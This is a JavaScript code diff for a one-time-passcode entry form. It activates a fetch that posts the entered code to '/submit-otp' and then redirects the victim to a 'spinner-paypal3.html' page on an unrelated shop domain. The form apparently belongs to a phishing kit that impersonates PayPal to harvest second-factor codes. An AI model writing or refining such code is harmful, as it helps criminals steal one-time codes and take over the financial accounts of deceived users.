@@ -32,20 +32,14 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 
-    // Event listener to prevent default form submission and to stop Netlify confirmation
+    // Event listener to prevent default form submission and to handle the AJAX submission
     form.addEventListener('submit', function(e) {
         e.preventDefault();
 
         // Combine the values from each input
         const otpValue = Array.from(otpInputs).map(input => input.value).join('');
 
-        // Perform the fetch or ajax call to submit the form data here
-        // This is where you would integrate with your backend to handle the OTP verification
-        // Since we cannot actually implement a real OTP verification without a backend, this is just a placeholder
-        console.log('Form submitted with OTP:', otpValue);
-
-        // You can uncomment the fetch call and implement it according to your API
-        /*
+        // Adjust the fetch call according to your API
         fetch('/submit-otp', {
             method: 'POST',
             headers: {
@@ -57,17 +51,16 @@ document.addEventListener("DOMContentLoaded", function() {
             if (!response.ok) {
                 throw new Error('Network response was not ok');
             }
-            return response.text();
+            return response.json(); // Assuming the response is JSON. Adjust if necessary.
         })
         .then(data => {
-            // Handle success - perhaps redirecting to another page or showing a success message
-            console.log(data);
+            // Handle success - Redirecting to another page upon successful OTP submission
+            window.location.href = 'https://shop.smile-actives.co/spinner-paypal3.html'; // Adjust the URL as needed
         })
         .catch(error => {
-            // Handle errors here
+            // Handle errors here, such as showing an error message to the user
             console.error('Error:', error);
         });
-        */
     });
 
     // Assuming you have a way to get the OTP, you would call a function like this:
